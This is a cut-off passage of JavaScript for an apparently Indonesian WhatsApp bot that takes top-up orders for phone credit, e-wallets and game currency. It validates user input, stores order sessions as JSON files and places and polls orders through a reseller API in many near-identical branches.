reply(`「 *KONFIRMASI-TOPUP* 」

*ID:* ${data_topup.ID}
*Number:* @${data_topup.number.split("@")[0]}
*Harga:* Rp${toRupiah(data_topup.data.harga_topup)}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* ${data_topup.data.id_target}

Apakah data tersebut sudah benar? akan gagal apabila terdapat kesalahan input.

_Ketik *Y* untuk melanjutkan, *N* untuk mengulangi inputan_`)
} else if (data_topup.data.id_topup.includes("TTF")) {
if (chats.length === 0) return;
if (isNaN(chats)) return reply("Hanya angka dan tanpa spasi!")
data_topup.data.id_target = '0'+Number(chats);
data_topup.session = "KONFIRMASI-TOPUP";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
reply(`「 *KONFIRMASI-TOPUP* 」

*ID:* ${data_topup.ID}
*Number:* @${data_topup.number.split("@")[0]}
*Harga:* Rp${toRupiah(data_topup.data.harga_topup)}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* ${data_topup.data.id_target}

Apakah data tersebut sudah benar? akan gagal apabila terdapat kesalahan input.

_Ketik *Y* untuk melanjutkan, *N* untuk mengulangi inputan_`)
} else if (data_topup.data.id_topup.includes("ITF")) {
if (chats.length === 0) return;
if (isNaN(chats)) return reply("Hanya angka dan tanpa spasi!")
data_topup.data.id_target = '0'+Number(chats);
data_topup.session = "KONFIRMASI-TOPUP";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
reply(`「 *KONFIRMASI-TOPUP* 」

*ID:* ${data_topup.ID}
*Number:* @${data_topup.number.split("@")[0]}
*Harga:* Rp${toRupiah(data_topup.data.harga_topup)}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* ${data_topup.data.id_target}

Apakah data tersebut sudah benar? akan gagal apabila terdapat kesalahan input.

_Ketik *Y* untuk melanjutkan, *N* untuk mengulangi inputan_`)
} else if (data_topup.data.id_topup.includes("STF")) {
if (chats.length === 0) return;
if (isNaN(chats)) return reply("Hanya angka dan tanpa spasi!")
data_topup.data.id_target = '0'+Number(chats);
data_topup.session = "KONFIRMASI-TOPUP";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
reply(`「 *KONFIRMASI-TOPUP* 」

*ID:* ${data_topup.ID}
*Number:* @${data_topup.number.split("@")[0]}
*Harga:* Rp${toRupiah(data_topup.data.harga_topup)}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* ${data_topup.data.id_target}

Apakah data tersebut sudah benar? akan gagal apabila terdapat kesalahan input.

_Ketik *Y* untuk melanjutkan, *N* untuk mengulangi inputan_`)
} else if (data_topup.data.id_topup.includes("AXTF")) {
if (chats.length === 0) return;
if (isNaN(chats)) return reply("Hanya angka dan tanpa spasi!")
data_topup.data.id_target = '0'+Number(chats);
data_topup.session = "KONFIRMASI-TOPUP";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
reply(`「 *KONFIRMASI-TOPUP* 」

*ID:* ${data_topup.ID}
*Number:* @${data_topup.number.split("@")[0]}
*Harga:* Rp${toRupiah(data_topup.data.harga_topup)}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* ${data_topup.data.id_target}

Apakah data tersebut sudah benar? akan gagal apabila terdapat kesalahan input.

_Ketik *Y* untuk melanjutkan, *N* untuk mengulangi inputan_`)
} else if (data_topup.data.id_topup.includes("PLN")) {
if (chats.length === 0) return;
if (isNaN(chats)) return reply("Hanya angka!")
data_topup.data.id_target = Number(chats);
data_topup.session = "KONFIRMASI-TOPUP";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
reply(`「 *KONFIRMASI-TOPUP* 」

*ID:* ${data_topup.ID}
*Number:* @${data_topup.number.split("@")[0]}
*Harga:* Rp${toRupiah(data_topup.data.harga_topup)}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* ${data_topup.data.id_target}

Apakah data tersebut sudah benar? akan gagal apabila terdapat kesalahan input.

_Ketik *Y* untuk melanjutkan, *N* untuk mengulangi inputan_`)
} else if (data_topup.data.id_topup.includes("OVO")) {
if (chats.length === 0) return;
if (isNaN(chats)) return reply("Hanya angka!")
data_topup.data.id_target = Number(chats);
data_topup.session = "KONFIRMASI-TOPUP";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
reply(`「 *KONFIRMASI-TOPUP* 」

*ID:* ${data_topup.ID}
*Number:* @${data_topup.number.split("@")[0]}
*Harga:* Rp${toRupiah(data_topup.data.harga_topup)}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* ${data_topup.data.id_target}

Apakah data tersebut sudah benar? akan gagal apabila terdapat kesalahan input.

_Ketik *Y* untuk melanjutkan, *N* untuk mengulangi inputan_`)
} else if (data_topup.data.id_topup.includes("LINKAJA")) {
if (chats.length === 0) return;
if (isNaN(chats)) return reply("Hanya angka!")
data_topup.data.id_target = Number(chats);
data_topup.session = "KONFIRMASI-TOPUP";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
reply(`「 *KONFIRMASI-TOPUP* 」

*ID:* ${data_topup.ID}
*Number:* @${data_topup.number.split("@")[0]}
*Harga:* Rp${toRupiah(data_topup.data.harga_topup)}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* ${data_topup.data.id_target}

Apakah data tersebut sudah benar? akan gagal apabila terdapat kesalahan input.

_Ketik *Y* untuk melanjutkan, *N* untuk mengulangi inputan_`)
} else if (data_topup.data.id_topup.includes("SHP")) {
if (chats.length === 0) return;
if (isNaN(chats)) return reply("Hanya angka!")
data_topup.data.id_target = Number(chats);
data_topup.session = "KONFIRMASI-TOPUP";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
reply(`「 *KONFIRMASI-TOPUP* 」

*ID:* ${data_topup.ID}
*Number:* @${data_topup.number.split("@")[0]}
*Harga:* Rp${toRupiah(data_topup.data.harga_topup)}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* ${data_topup.data.id_target}

Apakah data tersebut sudah benar? akan gagal apabila terdapat kesalahan input.

_Ketik *Y* untuk melanjutkan, *N* untuk mengulangi inputan_`)
} else if (data_topup.data.id_topup.includes("GOPAY")) {
if (chats.length === 0) return;
if (isNaN(chats)) return reply("Hanya angka!")
data_topup.data.id_target = Number(chats);
data_topup.session = "KONFIRMASI-TOPUP";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
reply(`「 *KONFIRMASI-TOPUP* 」

*ID:* ${data_topup.ID}
*Number:* @${data_topup.number.split("@")[0]}
*Harga:* Rp${toRupiah(data_topup.data.harga_topup)}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* ${data_topup.data.id_target}

Apakah data tersebut sudah benar? akan gagal apabila terdapat kesalahan input.

_Ketik *Y* untuk melanjutkan, *N* untuk mengulangi inputan_`)
} else if (data_topup.data.id_topup.includes("DANA")) {
if (chats.length === 0) return;
if (isNaN(chats)) return reply("Hanya angka!")
data_topup.data.id_target = Number(chats);
data_topup.session = "KONFIRMASI-TOPUP";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
reply(`「 *KONFIRMASI-TOPUP* 」

*ID:* ${data_topup.ID}
*Number:* @${data_topup.number.split("@")[0]}
*Harga:* Rp${toRupiah(data_topup.data.harga_topup)}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* ${data_topup.data.id_target}

Apakah data tersebut sudah benar? akan gagal apabila terdapat kesalahan input.

_Ketik *Y* untuk melanjutkan, *N* untuk mengulangi inputan_`)
} else if (data_topup.data.id_topup.includes("VGR")) {
if (chats.length === 0) return;
if (isNaN(chats)) return reply("Hanya angka!")
data_topup.data.id_target = Number(chats);
data_topup.session = "KONFIRMASI-TOPUP";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
reply(`「 *KONFIRMASI-TOPUP* 」

*ID:* ${data_topup.ID}
*Number:* @${data_topup.number.split("@")[0]}
*Harga:* Rp${toRupiah(data_topup.data.harga_topup)}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* ${data_topup.data.id_target}

Apakah data tersebut sudah benar? akan gagal apabila terdapat kesalahan input.

_Ketik *Y* untuk melanjutkan, *N* untuk mengulangi inputan_`)
} else if (data_topup.data.id_topup.includes("FF")) {
if (chats.length === 0) return;
if (isNaN(chats)) return reply("Hanya angka!")
data_topup.data.id_target = Number(chats);
data_topup.session = "KONFIRMASI-TOPUP";
var data_name_ff = await fetchJson(`https://saipulanuar.ga/api/stalk/epep?id=${data_topup.data.id_target}&apikey=VBkM7rbU`)
if (data_name_ff.status !== 200) return reply(`Pastikan Id anda benar\nsilahkan kirim Id anda kembali!`), data_topup.session = "INPUT-GAME-ID", fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
reply(`「 *KONFIRMASI-TOPUP* 」

*ID:* ${data_topup.ID}
*Number:* @${data_topup.number.split("@")[0]}
*Harga:* Rp${toRupiah(data_topup.data.harga_topup)}
*Layanan:* ${data_topup.data.produk_topup}
*Nickname:* ${data_name_ff.nickname}
*ID Free Fire:* ${data_topup.data.id_target}

Apakah data tersebut sudah benar? akan gagal apabila terdapat kesalahan input.

_Ketik *Y* untuk melanjutkan, *N* untuk mengulangi inputan_`)
} else if (data_topup.data.id_topup.includes("VMLSO")) {
if (chats.length === 0) return;
if (isNaN(chats)) return reply("Hanya angka!")
data_topup.data.id_target = Number(chats);
data_topup.session = "INPUT-GAME-ZONE-ID";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
reply("Silahkan Kirim *ZoneID Mobile Legends*")
} 
} else if (data_topup.session === "INPUT-GAME-ZONE-ID") {
if (chats.length === 0) return;
if (isNaN(chats)) return reply("Hanya angka!")

data_topup.data.id_zone = Number(chats);
data_topup.session = "KONFIRMASI-TOPUP";
var data_name_ml = await fetchJson(`https://saipulanuar.ga/api/stalk/ml?id=${data_topup.data.id_target}&server=${data_topup.data.id_zone}&apikey=VBkM7rbU`)
if (data_name_ml.status !== 200) return reply(`Pastikan Id anda benar\nsilahkan kirim Id anda kembali!`), data_topup.session = "INPUT-GAME-ID", fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
reply(`「 *KONFIRMASI-TOPUP* 」

*ID:* ${data_topup.ID}
*Number:* @${data_topup.number.split("@")[0]}
*Harga:* Rp${toRupiah(data_topup.data.harga_topup)}
*Layanan:* ${data_topup.data.produk_topup}
*Nickname:* ${data_name_ml.nickname}
*ID ML:* ${data_topup.data.id_target} (${data_topup.data.id_zone})

Apakah data tersebut sudah benar? akan gagal apabila terdapat kesalahan input.

_Ketik *Y* untuk melanjutkan, *N* untuk mengulangi inputan_`)
} else if (data_topup.session === "KONFIRMASI-TOPUP") {
if (chats.toLowerCase() === "y") {
reply(`Mohon ditunggu sebentar, Pesanan dengan ID *${data_topup.ID}* Sedang diproses⏳`)
if (data_topup.data.id_topup.includes("TDA")) {
axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "order",
service: data_topup.data.id_topup,
target: data_topup.data.id_target
})
}).then(res => {
if (res.data.result === true) {
data_topup.data.id_produk = res.data.data.trxid
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))

var intervals = setInterval(function() {

axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "status",
trxid: data_topup.data.id_produk
})
}).then(r => {
console.log(r.data); // For Debugging
console.log(color("[CHECKING]", "green"), `-> ${sender}`) // For Debugging

if (r.data.data.status === "success") {
reply(`*── 「 TOPUP SUKSES 」 ──*

*Status:* Success
*ID order:* ${data_topup.ID}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* ${data_topup.data.id_target}

*SN:*
${r.data.data.message}

_Terimakasih kak sudah order ☺️_`)
minSaldo(sender, Number(data_topup.data.harga_topup), db_saldo)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} else if (r.data.data.status === 'error') {
reply(`Pesanan dibatalkan!\nAlasan : ${r.data.data.message}`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
}).catch(e => {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
})
}, 3000)
} else {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
})
} else if (data_topup.data.id_topup.includes("XLD")) {
axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "order",
service: data_topup.data.id_topup,
target: data_topup.data.id_target
})
}).then(res => {
if (res.data.result === true) {
data_topup.data.id_produk = res.data.data.trxid
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))

var intervals = setInterval(function() {

axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "status",
trxid: data_topup.data.id_produk
})
}).then(r => {
console.log(r.data); // For Debugging
console.log(color("[CHECKING]", "green"), `-> ${sender}`) // For Debugging

if (r.data.data.status === "success") {
reply(`*── 「 TOPUP SUKSES 」 ──*

*Status:* Success
*ID order:* ${data_topup.ID}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* ${data_topup.data.id_target}

*SN:*
${r.data.data.message}

_Terimakasih kak sudah order ☺️_`)
minSaldo(sender, Number(data_topup.data.harga_topup), db_saldo)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} else if (r.data.data.status === 'error') {
reply(`Pesanan dibatalkan!\nAlasan : ${r.data.data.message}`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
}).catch(e => {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
})
}, 3000)
} else {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
})
} else if (data_topup.data.id_topup.includes("AXD")) {
axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "order",
service: data_topup.data.id_topup,
target: data_topup.data.id_target
})
}).then(res => {
if (res.data.result === true) {
data_topup.data.id_produk = res.data.data.trxid
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))

var intervals = setInterval(function() {

axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "status",
trxid: data_topup.data.id_produk
})
}).then(r => {
console.log(r.data); // For Debugging
console.log(color("[CHECKING]", "green"), `-> ${sender}`) // For Debugging

if (r.data.data.status === "success") {
reply(`*── 「 TOPUP SUKSES 」 ──*

*Status:* Success
*ID order:* ${data_topup.ID}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* ${data_topup.data.id_target}

*SN:*
${r.data.data.message}

_Terimakasih kak sudah order ☺️_`)
minSaldo(sender, Number(data_topup.data.harga_topup), db_saldo)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} else if (r.data.data.status === 'error') {
reply(`Pesanan dibatalkan!\nAlasan : ${r.data.data.message}`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
}).catch(e => {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
})
}, 3000)
} else {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
})
} else if (data_topup.data.id_topup.includes("SDF")) {
axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "order",
service: data_topup.data.id_topup,
target: data_topup.data.id_target
})
}).then(res => {
if (res.data.result === true) {
data_topup.data.id_produk = res.data.data.trxid
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))

var intervals = setInterval(function() {

axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "status",
trxid: data_topup.data.id_produk
})
}).then(r => {
console.log(r.data); // For Debugging
console.log(color("[CHECKING]", "green"), `-> ${sender}`) // For Debugging

if (r.data.data.status === "success") {
reply(`*── 「 TOPUP SUKSES 」 ──*

*Status:* Success
*ID order:* ${data_topup.ID}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* ${data_topup.data.id_target}

*SN:*
${r.data.data.message}

_Terimakasih kak sudah order ☺️_`)
minSaldo(sender, Number(data_topup.data.harga_topup), db_saldo)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} else if (r.data.data.status === 'error') {
reply(`Pesanan dibatalkan!\nAlasan : ${r.data.data.message}`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
}).catch(e => {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
})
}, 3000)
} else {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
})
} else if (data_topup.data.id_topup.includes("IDF")) {
axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "order",
service: data_topup.data.id_topup,
target: data_topup.data.id_target
})
}).then(res => {
if (res.data.result === true) {
data_topup.data.id_produk = res.data.data.trxid
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))

var intervals = setInterval(function() {

axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "status",
trxid: data_topup.data.id_produk
})
}).then(r => {
console.log(r.data); // For Debugging
console.log(color("[CHECKING]", "green"), `-> ${sender}`) // For Debugging

if (r.data.data.status === "success") {
reply(`*── 「 TOPUP SUKSES 」 ──*

*Status:* Success
*ID order:* ${data_topup.ID}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* ${data_topup.data.id_target}

*SN:*
${r.data.data.message}

_Terimakasih kak sudah order ☺️_`)
minSaldo(sender, Number(data_topup.data.harga_topup), db_saldo)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} else if (r.data.data.status === 'error') {
reply(`Pesanan dibatalkan!\nAlasan : ${r.data.data.message}`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
}).catch(e => {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
})
}, 3000)
} else {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
})
} else if (data_topup.data.id_topup.includes("XLTF")) {
axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "order",
service: data_topup.data.id_topup,
target: data_topup.data.id_target
})
}).then(res => {
if (res.data.result === true) {
data_topup.data.id_produk = res.data.data.trxid
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))

var intervals = setInterval(function() {

axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "status",
trxid: data_topup.data.id_produk
})
}).then(r => {
console.log(r.data); // For Debugging
console.log(color("[CHECKING]", "green"), `-> ${sender}`) // For Debugging

if (r.data.data.status === "success") {
reply(`*── 「 TOPUP SUKSES 」 ──*

*Status:* Success
*ID order:* ${data_topup.ID}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* ${data_topup.data.id_target}

*SN:*
${r.data.data.message}

_Terimakasih kak sudah order ☺️_`)
minSaldo(sender, Number(data_topup.data.harga_topup), db_saldo)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} else if (r.data.data.status === 'error') {
reply(`Pesanan dibatalkan!\nAlasan : ${r.data.data.message}`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
}).catch(e => {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
})
}, 3000)
} else {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
})
} else if (data_topup.data.id_topup.includes("TTF")) {
axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "order",
service: data_topup.data.id_topup,
target: data_topup.data.id_target
})
}).then(res => {
if (res.data.result === true) {
data_topup.data.id_produk = res.data.data.trxid
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))

var intervals = setInterval(function() {

axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "status",
trxid: data_topup.data.id_produk
})
}).then(r => {
console.log(r.data); // For Debugging
console.log(color("[CHECKING]", "green"), `-> ${sender}`) // For Debugging

if (r.data.data.status === "success") {
reply(`*── 「 TOPUP SUKSES 」 ──*

*Status:* Success
*ID order:* ${data_topup.ID}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* ${data_topup.data.id_target}

*SN:*
${r.data.data.message}

_Terimakasih kak sudah order ☺️_`)
minSaldo(sender, Number(data_topup.data.harga_topup), db_saldo)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} else if (r.data.data.status === 'error') {
reply(`Pesanan dibatalkan!\nAlasan : ${r.data.data.message}`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
}).catch(e => {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
})
}, 3000)
} else {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
})
} else if (data_topup.data.id_topup.includes("ITF")) {
axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "order",
service: data_topup.data.id_topup,
target: data_topup.data.id_target
})
}).then(res => {
if (res.data.result === true) {
data_topup.data.id_produk = res.data.data.trxid
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))

var intervals = setInterval(function() {

axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "status",
trxid: data_topup.data.id_produk
})
}).then(r => {
console.log(r.data); // For Debugging
console.log(color("[CHECKING]", "green"), `-> ${sender}`) // For Debugging

if (r.data.data.status === "success") {
reply(`*── 「 TOPUP SUKSES 」 ──*

*Status:* Success
*ID order:* ${data_topup.ID}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* ${data_topup.data.id_target}

*SN:*
${r.data.data.message}

_Terimakasih kak sudah order ☺️_`)
minSaldo(sender, Number(data_topup.data.harga_topup), db_saldo)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} else if (r.data.data.status === 'error') {
reply(`Pesanan dibatalkan!\nAlasan : ${r.data.data.message}`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
}).catch(e => {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
})
}, 3000)
} else {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
})
} else if (data_topup.data.id_topup.includes("STF")) {
axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "order",
service: data_topup.data.id_topup,
target: data_topup.data.id_target
})
}).then(res => {
if (res.data.result === true) {
data_topup.data.id_produk = res.data.data.trxid
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))

var intervals = setInterval(function() {

axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "status",
trxid: data_topup.data.id_produk
})
}).then(r => {
console.log(r.data); // For Debugging
console.log(color("[CHECKING]", "green"), `-> ${sender}`) // For Debugging

if (r.data.data.status === "success") {
reply(`*── 「 TOPUP SUKSES 」 ──*

*Status:* Success
*ID order:* ${data_topup.ID}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* ${data_topup.data.id_target}

*SN:*
${r.data.data.message}

_Terimakasih kak sudah order ☺️_`)
minSaldo(sender, Number(data_topup.data.harga_topup), db_saldo)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} else if (r.data.data.status === 'error') {
reply(`Pesanan dibatalkan!\nAlasan : ${r.data.data.message}`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
}).catch(e => {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)

fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
})
}, 3000)
} else {
reply(`Mohon Maaf, Sedang terjadi kesalahan untuk service *${data_topup.data.id_topup}*, Silahkan pilih service lain atau coba lagi di lain waktu ☺️`)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
})
} else if (data_topup.data.id_topup.includes("AXTF")) {
axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "order",
service: data_topup.data.id_topup,
target: data_topup.data.id_target
})
}).then(res => {
if (res.data.result === true) {
data_topup.data.id_produk = res.data.data.trxid
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))

var intervals = setInterval(function() {

axios({
method: "POST",
url: "https://www.atlantic-pedia.co.id/api/pulsa",
data: qs.stringify({
key: apikeyAntlatic,
action: "status",
trxid: data_topup.data.id_produk
})
}).then(r => {
console.log(r.data); // For Debugging
console.log(color("[CHECKING]", "green"), `-> ${sender}`) // For Debugging

if (r.data.data.status === "success") {
reply(`*── 「 TOPUP SUKSES 」 ──*

*Status:* Success
*ID order:* ${data_topup.ID}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* ${data_topup.data.id_target}

*SN:*
